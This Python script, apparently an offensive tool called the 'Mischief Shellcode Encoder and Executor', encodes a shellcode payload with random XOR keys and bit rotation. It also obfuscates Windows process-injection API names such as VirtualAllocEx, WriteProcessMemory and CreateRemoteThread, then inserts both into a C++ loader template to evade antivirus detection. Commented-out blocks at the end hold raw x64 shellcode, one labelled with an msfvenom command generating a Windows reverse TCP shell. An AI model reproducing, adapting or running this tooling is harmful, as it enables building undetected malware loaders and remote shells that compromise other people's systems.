import struct
import sys
from random import randint
import os
import argparse

KEY = randint(1,255)
KEY2 = randint(1,255)
SHIFT = randint(1,8)
VIRTUAL = ("\x56\x69\x72\x74\x75\x61\x6C\x41\x6C\x6C\x6F\x63")
THREAD =  ("\x43\x72\x65\x61\x74\x65\x54\x68\x72\x65\x61\x64")
WAIT = ("\x57\x61\x69\x74\x46\x6F\x72\x53\x69\x6E\x67\x6C\x65\x4F\x62\x6A\x65\x63\x74")
EXNUMA = ("\x56\x69\x72\x74\x75\x61\x6C\x41\x6C\x6C\x6F\x63\x45\x78\x4E\x75\x6D\x61")
VIRTALLOCEX = ("\x56\x69\x72\x74\x75\x61\x6C\x41\x6C\x6C\x6F\x63\x45\x78")
WRITEPROCMEM = ("\x57\x72\x69\x74\x65\x50\x72\x6F\x63\x65\x73\x73\x4D\x65\x6D\x6F\x72\x79")
CREATEREMOTETHREAD = ("\x43\x72\x65\x61\x74\x65\x52\x65\x6D\x6F\x74\x65\x54\x68\x72\x65\x61\x64")
CLOSEHANDLE = ("\x43\x6C\x6F\x73\x65\x48\x61\x6E\x64\x6C\x65")
OPENPROC = ("\x4F\x70\x65\x6E\x50\x72\x6F\x63\x65\x73\x73")
KERNEL32 = ("\x6B\x65\x72\x6E\x65\x6C\x33\x32")
DEBUG = False

def open_file(path):
	if os.path.exists(path):
		print(f"> Reading file: {path}")

		with open(path,"rb") as file:
			data = file.read()
			file.close()

			if len(data) > 0:
				return data
			else:
				raise Exception(f"File is empty - {file}")
	else:
		raise Exception(f"Error - Check your file/path: {path}")


def gen_string(length):
	rand_bytes = bytearray()

	for i in range(0,length):
		rand_bytes.append(randint(1,255))
	return rand_bytes

def debug(string):
	print("[*]DEBUG: " + str(string))

def print_int(type, name, data):
	formatted = f'{type} {name} = {data};'
	if DEBUG:
		print(formatted)
	return formatted


def gen_hex(data):
	raw = ''
	length = len(data)

	for i in range(0, length):
		if i == length - 1:
			raw += hex(data[i]).replace('0x', 'x')
		else:
			raw += hex(data[i]).replace('0x', 'x') + "\\"

	return f"\\{raw}"


def print_hex_formatted(name, data):
	# Format data to be put into the template
	raw = ''
	length = len(data)

	for i in range(0,length):
		if i == length -1:
			raw += hex(data[i]).replace('0x', 'x')
		else:
			raw += hex(data[i]).replace('0x', 'x') + "\\"


	formatted = f'unsigned char {name}[] =\n"\\{raw}";'

	if DEBUG:
		print(formatted)

	return formatted


def string_to_bytes(data):

	bytes_lst = []

	for f in data:
		bytes_lst.append(ord(f))
	return bytes_lst

def circshift(x,n):
	return (x << n) & 0xFF | (x >> (8 - n) )


def xor(byte1, byte2):
	return byte1 ^ byte2

def encode_string(string, name):
	key = gen_string(len(string))

	#print_hex_formatted(f"{name}_key", key)

	encoded = bytearray()

	for i in range(0,len(key)):
		encoded.append(xor(key[i], string[i]))

	return key, encoded


def encode_byte(key, key2, shift, byte):
	# XOR with first byte key
	global DEBUG

	r1 = xor(key,byte)

	#debug(f'{hex(key)} ^ {hex(byte)} == {hex(r1)}')

	# Circ shift & 0xFF
	r2 = circshift(r1,shift)

	#debug(f'{hex(r1)} SHIFT {hex(shift)} == {hex(r2)}')

	return xor(r2, key2)


def encode_shellcode(data):
	if DEBUG:
		debug(f"Key: {KEY} - Shift: {SHIFT} - KEY2: {KEY2}")

		#key = print_int("unsigned char", "key",KEY)
		#key2 = print_int("unsigned char", "key2", KEY2)
		#shift = print_int("int", "shift", SHIFT)

	for i in range(0,len(data)):
		data[i] = encode_byte(KEY, KEY2, SHIFT, data[i])
		#print(hex(data[i]))c

	return data

def write_template(modified_template,path):
	with open(path, "w") as file:
		file.write(modified_template)
		file.close()

	if DEBUG:
		debug(f'Written new cpp to disk: {path}')


def generate_shellcode(shellcode):
	print("> Encoding shellcode...")
	#raw = string_to_bytes(shellcode)

	encoded_shellcode = encode_shellcode(shellcode)


	return encoded_shellcode

def check_keys():
	print("> Verifying XOR keys..")
	global KEY
	global KEY2

	if KEY == KEY2:
		KEY = randint(1,255)

	if DEBUG:
		debug(f"Payload keys: {KEY} - {KEY2}")


def generate(path2shell,path2template):

	debug(f'Path2shell: {path2shell}')
	debug(f'Path2template: {path2template}')



	# Read template file
	template = open_file(path2template)
	check_keys()
	global KEY
	global KEY2

	key_place = 'place_key'
	key2_place = 'place_2key'
	shift_place = 'place_shift'
	shellcode_place = 'place_shellcode'
	vallockey_place = 'place_k_vallocx'
	openprockey_place = 'place_open_proc_key'
	writeprockey_place = 'place_write_proc_key'
	closehandlekey_place = 'place_close_handle_key'
	kernelkey_place = 'place_k_kernel32'
	valloc_place ='place_vallocex'
	openprc_place = 'place_openPRC'
	writeprc_place = 'place_writePRC'
	handle_place = 'place_closeHandle'
	kernel_place = 'place_kernel32'



	# Read our shellcode file
	raw_shellcode = bytearray(open_file(path2shell))

	#print_hex_formatted("test", raw_shellcode)

	# Encode the shellcode

	encoded_shellcode= generate_shellcode(raw_shellcode)

	shellcode_string = gen_hex(encoded_shellcode)

	vallocx_key, vallocex = encode_string(string_to_bytes(VIRTALLOCEX), 'vallocx')
	rmthread_key, rmthread = encode_string(string_to_bytes(CREATEREMOTETHREAD), 'remote_thread')
	openproc_key, openProc = encode_string(string_to_bytes(OPENPROC), 'open_proc')
	writeproc_key, writeProc = encode_string(string_to_bytes(WRITEPROCMEM), 'write_proc')
	closehandle_key, closeHandle = encode_string(string_to_bytes(CLOSEHANDLE), 'close_handle')
	kernel32key, kernel32 = encode_string(string_to_bytes(KERNEL32), 'kernel32')


	if DEBUG:
		debug(f'Shellcode: {shellcode_string}')
		debug(f'vallocex: {gen_hex(vallocex)} - key: {gen_hex(vallocx_key)}')
		debug(f'rmthread: {rmthread} - key: {rmthread_key}')
		debug(f'openProc: {openProc} - key: {openproc_key}')
		debug(f'writeProc: {writeProc} - key: {writeproc_key}')
		debug(f'closehandle: {closeHandle} - key: {closehandle_key}')
		debug(f'kernel32: {kernel32} - key: {kernel32key}')


	temp_dec = template.decode('utf-8')
	temp_dec = temp_dec.replace(key_place, str(KEY))
	temp_dec = temp_dec.replace(key2_place, str(KEY2))
	temp_dec = temp_dec.replace(shift_place, str(SHIFT))
	temp_dec = temp_dec.replace(shellcode_place, shellcode_string)
	temp_dec = temp_dec.replace(vallockey_place, gen_hex(vallocx_key))
	temp_dec = temp_dec.replace(valloc_place, gen_hex(vallocex))
	temp_dec = temp_dec.replace(openprc_place, gen_hex(openProc))
	temp_dec = temp_dec.replace(openprockey_place, gen_hex(openproc_key))
	temp_dec = temp_dec.replace(writeprockey_place, gen_hex(writeproc_key))
	temp_dec = temp_dec.replace(writeprc_place, gen_hex(writeProc))
	temp_dec = temp_dec.replace(handle_place, gen_hex(closeHandle))
	temp_dec = temp_dec.replace(closehandlekey_place, gen_hex(closehandle_key))
	temp_dec = temp_dec.replace(kernelkey_place, gen_hex(kernel32key))
	temp_dec = temp_dec.replace(kernel_place, gen_hex(kernel32))


	return temp_dec


def print_banner():
	print("""

	                                    ******,,,******                             
	                               .***    ......      .**,                         
	                             **,   ...........         **                       
	                           **  ,.............            **                     
	                         **  (...............           . .**                   
	,                      ,*, *(..................          (  **             .    
	       ***********,,,,**  (*................              *  **              **,
	    .******,      .,***  (,............                    *  *********.        
	   ******           **  (,....(...                          ( .*. .******       
	******.            *,  (/..(,..                              , **    *******,   
	****              ,*. /(/(..                                 ( .*.      ********
	**,               **  ((..                                   (  *,        ******
	**              ,*,  (/..                                    .  **        .*****
	       .       ,*.  (..       .@&...                         (/ ,*. .      *****
	      *       .*.  (..         ..&@@@&.         .....#@.      (  ,*  *          
	    *         **  (..             ....        .@@@@@%.         (  **  **        
	   *.        ,*  /(..                                          (  ,*    ,*      
	   *         **  ((..       *                                   ,  **    ,      
	  .          **  /(..       .*                       .,        .   **    .      
	        ,*****,   /(..        *                     *          (  ,*            
	   ***,     /((...   (,.       .                  *.         /(  ,***.          
	**.    (((...........    *                                 (,  ,,     ,***  ****
	   (((,.................                               .    .......((/    ,*****
	(((........................ ..                          ..............,((*   .**
	*............................... ..               ........................((/   
	........................................       .............................((( 
	....... ... .............  ................. .............. ................../(
	......... .  ..............     ........................ ......................(
	..........   ..................  .................... ................  ........
	...........   .......................................................   ........
	............    ....................................................   .........""")
	print("\n\nLets Cause Some Mischief.")

def set_verbose():
	global DEBUG
	DEBUG = True

if __name__ == "__main__":

	parser = argparse.ArgumentParser(description='Mischief Shellcode Encoder and Executor.. ')
	parser.add_argument('--payload', type=str,
						help='Path to your shellcode payload',metavar='path2payload', required=True)
	parser.add_argument('--out',
						help='Full path to output file /w exe name - /tmp/payload.exe', required=True,  metavar='OutputPath')
	parser.add_argument('--method',
						help='Execution method: Call, NtCreateThread... ', required=False,
						metavar='method')
	parser.add_argument('--verbose',
						help='Displays Debug info ', required=False, action="store_true")

	args = parser.parse_args()
	outfile = args.out
	shellcode_file = args.payload

	if args.verbose:
		set_verbose()

	if args.method is None or args.method == "call":
		mod_template = generate("payload.bin","main.cpp")
		out_file = args.out 
		if not args.out:
			raise Exception("Specify a --out filename")
		else:
			write_template(mod_template, "C:\\Users\\Mitchell\\source\\repos\\Mischief\\Mischief-Encoder\\test.cpp")



# LAST WORKING SHELLCODE...
# 	shellcode = ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
# "\xff\xff\x48\xbb\x9a\xe3\x95\xa6\x89\x76\xbd\xe0\x48\x31\x58"
# "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x66\xab\x16\x42\x79\x9e"
# "\x7d\xe0\x9a\xe3\xd4\xf7\xc8\x26\xef\xb1\xcc\xab\xa4\x74\xec"
# "\x3e\x36\xb2\xfa\xab\x1e\xf4\x91\x3e\x36\xb2\xba\xab\x1e\xd4"
# "\xd9\x3e\xb2\x57\xd0\xa9\xd8\x97\x40\x3e\x8c\x20\x36\xdf\xf4"
# "\xda\x8b\x5a\x9d\xa1\x5b\x2a\x98\xe7\x88\xb7\x5f\x0d\xc8\xa2"
# "\xc4\xee\x02\x24\x9d\x6b\xd8\xdf\xdd\xa7\x59\xfd\x3d\x68\x9a"
# "\xe3\x95\xee\x0c\xb6\xc9\x87\xd2\xe2\x45\xf6\x02\x3e\xa5\xa4"
# "\x11\xa3\xb5\xef\x88\xa6\x5e\xb6\xd2\x1c\x5c\xe7\x02\x42\x35"
# "\xa8\x9b\x35\xd8\x97\x40\x3e\x8c\x20\x36\xa2\x54\x6f\x84\x37"
# "\xbc\x21\xa2\x03\xe0\x57\xc5\x75\xf1\xc4\x92\xa6\xac\x77\xfc"
# "\xae\xe5\xa4\x11\xa3\xb1\xef\x88\xa6\xdb\xa1\x11\xef\xdd\xe2"
# "\x02\x36\xa1\xa9\x9b\x33\xd4\x2d\x8d\xfe\xf5\xe1\x4a\xa2\xcd"
# "\xe7\xd1\x28\xe4\xba\xdb\xbb\xd4\xff\xc8\x2c\xf5\x63\x76\xc3"
# "\xd4\xf4\x76\x96\xe5\xa1\xc3\xb9\xdd\x2d\x9b\x9f\xea\x1f\x65"
# "\x1c\xc8\xef\x37\x01\xce\xd2\xc5\xd0\xa7\xa6\x89\x37\xeb\xa9"
# "\x13\x05\xdd\x27\x65\xd6\xbc\xe0\x9a\xaa\x1c\x43\xc0\xca\xbf"
# "\xe0\x8b\xbf\x55\x0e\x70\xf4\xfc\xb4\xd3\x6a\x71\xea\x00\x87"
# "\xfc\x5a\xd6\x94\xb3\xa1\x76\xa3\xf1\x69\x70\x8b\x94\xa7\x89"
# "\x76\xe4\xa1\x20\xca\x15\xcd\x89\x89\x68\xb0\xca\xae\xa4\x6f"
# "\xc4\x47\x7d\xa8\x65\x23\xdd\x2f\x4b\x3e\x42\x20\xd2\x6a\x54"
# "\xe7\x33\x9c\xb2\x3f\x7a\x1c\x40\xee\x00\xb1\xd7\xf0\xdb\xbb"
# "\xd9\x2f\x6b\x3e\x34\x19\xdb\x59\x0c\x03\xfd\x17\x42\x35\xd2"
# "\x62\x51\xe6\x8b\x76\xbd\xa9\x22\x80\xf8\xc2\x89\x76\xbd\xe0"
# "\x9a\xa2\xc5\xe7\xd9\x3e\x34\x02\xcd\xb4\xc2\xeb\xb8\xb6\xd7"
# "\xed\xc3\xa2\xc5\x44\x75\x10\x7a\xa4\xbe\xb7\x94\xa7\xc1\xfb"
# "\xf9\xc4\x82\x25\x95\xce\xc1\xff\x5b\xb6\xca\xa2\xc5\xe7\xd9"
# "\x37\xed\xa9\x65\x23\xd4\xf6\xc0\x89\x75\xad\x13\x22\xd9\x2f"
# "\x48\x37\x07\x99\x56\xdc\x13\x59\x5c\x3e\x8c\x32\xd2\x1c\x5f"
# "\x2d\x87\x37\x07\xe8\x1d\xfe\xf5\x59\x5c\xcd\x5d\xfd\xb0\xe9"
# "\xd4\x1c\x2f\xe3\x00\x7d\x65\x36\xdd\x25\x4d\x5e\x81\xe6\xe6"
# "\xe9\x15\x5d\x69\x03\xb8\x5b\xdd\xf0\xe7\xc9\xe3\x76\xe4\xa1"
# "\x13\x39\x6a\x73\x89\x76\xbd\xe0")





	#valloc = encode_string(string_to_bytes(VIRTUAL), "valloc")

	#print_hex_formatted("valloc", valloc)

	#create_thread = encode_string(string_to_bytes(THREAD), 'create_thread')

	#print_hex_formatted("create_thread", create_thread)

	#waitForSingleObject = encode_string(string_to_bytes(WAIT), 'waitFor')

	#print_hex_formatted("wait_for", waitForSingleObject)


	#exnuma_e = encode_string(string_to_bytes(EXNUMA), 'numa')
	#print_hex_formatted("numa", exnuma_e)






# shellcode = ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
	# "\xff\xff\x48\xbb\xe1\xe3\xec\xa1\x72\xc7\xe2\x24\x48\x31\x58"
	# "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1d\xab\x6f\x45\x82\x2f"
	# "\x22\x24\xe1\xe3\xad\xf0\x33\x97\xb0\x75\xb7\xab\xdd\x73\x17"
	# "\x8f\x69\x76\x81\xab\x67\xf3\x6a\x8f\x69\x76\xc1\xab\x67\xd3"
	# "\x22\x8f\xed\x93\xab\xa9\xa1\x90\xbb\x8f\xd3\xe4\x4d\xdf\x8d"
	# "\xdd\x70\xeb\xc2\x65\x20\x2a\xe1\xe0\x73\x06\x00\xc9\xb3\xa2"
	# "\xbd\xe9\xf9\x95\xc2\xaf\xa3\xdf\xa4\xa0\xa2\x4c\x62\xac\xe1"
	# "\xe3\xec\xe9\xf7\x07\x96\x43\xa9\xe2\x3c\xf1\xf9\x8f\xfa\x60"
	# "\x6a\xa3\xcc\xe8\x73\x17\x01\x72\xa9\x1c\x25\xe0\xf9\xf3\x6a"
	# "\x6c\xe0\x35\xa1\x90\xbb\x8f\xd3\xe4\x4d\xa2\x2d\x68\x7f\x86"
	# "\xe3\xe5\xd9\x03\x99\x50\x3e\xc4\xae\x00\xe9\xa6\xd5\x70\x07"
	# "\x1f\xba\x60\x6a\xa3\xc8\xe8\x73\x17\x84\x65\x6a\xef\xa4\xe5"
	# "\xf9\x87\xfe\x6d\xe0\x33\xad\x2a\x76\x4f\xaa\x25\x31\xa2\xb4"
	# "\xe0\x2a\x99\xbb\x7e\xa0\xbb\xad\xf8\x33\x9d\xaa\xa7\x0d\xc3"
	# "\xad\xf3\x8d\x27\xba\x65\xb8\xb9\xa4\x2a\x60\x2e\xb5\xdb\x1e"
	# "\x1c\xb1\xe8\xcc\xb0\x91\x16\xbe\xd0\xde\xa1\x72\x86\xb4\x6d"
	# "\x68\x05\xa4\x20\x9e\x67\xe3\x24\xe1\xaa\x65\x44\x3b\x7b\xe0"
	# "\x24\xe0\x58\x93\xa1\x72\xc6\xa3\x70\xa8\x6a\x08\xed\xfb\x36"
	# "\xa3\x9e\xad\x94\xca\xa6\x8d\x12\xae\xad\x0b\x8b\xed\xa0\x72"
	# "\xc7\xbb\x65\x5b\xca\x6c\xca\x72\x38\x37\x74\xb1\xae\xdd\x68"
	# "\x3f\xf6\x22\x6c\x1e\x23\xa4\x28\xb0\x8f\x1d\xe4\xa9\x6a\x2d"
	# "\xe0\xc8\x2d\xed\xfb\x01\x1c\x39\xe9\xfb\x00\x88\x34\xa0\xbb"
	# "\xa0\x28\x90\x8f\x6b\xdd\xa0\x59\x75\x04\x06\xa6\x1d\xf1\xa9"
	# "\x62\x28\xe1\x70\xc7\xe2\x6d\x59\x80\x81\xc5\x72\xc7\xe2\x24"
	# "\xe1\xa2\xbc\xe0\x22\x8f\x6b\xc6\xb6\xb4\xbb\xec\x43\x07\x88"
	# "\x29\xb8\xa2\xbc\x43\x8e\xa1\x25\x60\xc5\xb7\xed\xa0\x3a\x4a"
	# "\xa6\x00\xf9\x25\xec\xc9\x3a\x4e\x04\x72\xb1\xa2\xbc\xe0\x22"
	# "\x86\xb2\x6d\x1e\x23\xad\xf1\x3b\x38\x2a\x69\x68\x22\xa0\x28"
	# "\xb3\x86\x58\x5d\x2d\xdc\x6a\x5e\xa7\x8f\xd3\xf6\xa9\x1c\x26"
	# "\x2a\x7c\x86\x58\x2c\x66\xfe\x8c\x5e\xa7\x7c\x12\x91\x43\xb5"
	# "\xad\x1b\xd4\x52\x5f\xb9\x1e\x36\xa4\x22\xb6\xef\xde\x22\x9d"
	# "\xe9\x6c\x5a\x92\xb2\xe7\x9f\xa6\xf0\x9e\xce\x18\xc7\xbb\x65"
	# "\x68\x39\x13\x74\x72\xc7\xe2\x24")


#msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f c -b \x00\x0a\x0d\xff -k

# 	shellcode = ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
# "\xff\xff\x48\xbb\xbf\xd2\x63\x41\xc8\xac\x16\x1e\x48\x31\x58"
# "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x43\x9a\xe0\xa5\x38\x44"
# "\xd6\x1e\xbf\xd2\x22\x10\x89\xfc\x44\x4f\xe9\x9a\x52\x93\xad"
# "\xe4\x9d\x4c\xdf\x9a\xe8\x13\xd0\xe4\x9d\x4c\x9f\x9a\xe8\x33"
# "\x98\xe4\x19\xa9\xf5\x98\x2e\x70\x01\xe4\x27\xde\x13\xee\x02"
# "\x3d\xca\x80\x36\x5f\x7e\x1b\x6e\x00\xc9\x6d\xf4\xf3\xed\x93"
# "\x32\x09\x43\xfe\x36\x95\xfd\xee\x2b\x40\x18\x27\x96\x96\xbf"
# "\xd2\x63\x09\x4d\x6c\x62\x79\xf7\xd3\xb3\x11\x43\xe4\x0e\x5a"
# "\x34\x92\x43\x08\xc9\x7c\xf5\x48\xf7\x2d\xaa\x00\x43\x98\x9e"
# "\x56\xbe\x04\x2e\x70\x01\xe4\x27\xde\x13\x93\xa2\x88\xc5\xed"
# "\x17\xdf\x87\x32\x16\xb0\x84\xaf\x5a\x3a\xb7\x97\x5a\x90\xbd"
# "\x74\x4e\x5a\x34\x92\x47\x08\xc9\x7c\x70\x5f\x34\xde\x2b\x05"
# "\x43\xec\x0a\x57\xbe\x02\x22\xca\xcc\x24\x5e\x1f\x6f\x93\x3b"
# "\x00\x90\xf2\x4f\x44\xfe\x8a\x22\x18\x89\xf6\x5e\x9d\x53\xf2"
# "\x22\x13\x37\x4c\x4e\x5f\xe6\x88\x2b\xca\xda\x45\x41\xe1\x40"
# "\x2d\x3e\x08\x76\xdb\x65\x2c\xe0\xe1\x51\x41\xc8\xed\x40\x57"
# "\x36\x34\x2b\xc0\x24\x0c\x17\x1e\xbf\x9b\xea\xa4\x81\x10\x14"
# "\x1e\xbe\x69\x1c\x41\xc8\xad\x57\x4a\xf6\x5b\x87\x0d\x41\x5d"
# "\x57\xa4\xf3\xa5\x45\x46\x37\x79\x5a\x97\x55\xba\x62\x40\xc8"
# "\xac\x4f\x5f\x05\xfb\xe3\x2a\xc8\x53\xc3\x4e\xef\x9f\x52\x88"
# "\x85\x9d\xd6\x56\x40\x12\x2b\xc8\x0a\xe4\xe9\xde\xf7\x5b\xa2"
# "\x00\x72\x46\x19\xc1\x5f\x2d\xb6\x09\x41\x6b\x7c\x0e\xfe\x8a"
# "\x2f\xc8\x2a\xe4\x9f\xe7\xfe\x68\xfa\xe4\xbc\xcd\xe9\xcb\xf7"
# "\x53\xa7\x01\xca\xac\x16\x57\x07\xb1\x0e\x25\xc8\xac\x16\x1e"
# "\xbf\x93\x33\x00\x98\xe4\x9f\xfc\xe8\x85\x34\x0c\xf9\x6c\x7c"
# "\x13\xe6\x93\x33\xa3\x34\xca\xd1\x5a\x9b\x86\x62\x40\x80\x21"
# "\x52\x3a\xa7\x14\x63\x29\x80\x25\xf0\x48\xef\x93\x33\x00\x98"
# "\xed\x46\x57\x40\x12\x22\x11\x81\x53\xde\x53\x36\x13\x2f\xc8"
# "\x09\xed\xac\x67\x73\xed\xe5\xbe\x1d\xe4\x27\xcc\xf7\x2d\xa9"
# "\xca\xc6\xed\xac\x16\x38\xcf\x03\xbe\x1d\x17\xf6\x03\x95\xd8"
# "\x22\xfb\x6e\x39\xab\x83\x40\x07\x2b\xc2\x0c\x84\x2a\x18\xc3"
# "\xd8\xe3\xba\x28\xd9\x13\xa5\xf8\xc1\x11\x2e\xa2\xac\x4f\x5f"
# "\x36\x08\x9c\x94\xc8\xac\x16\x1e")





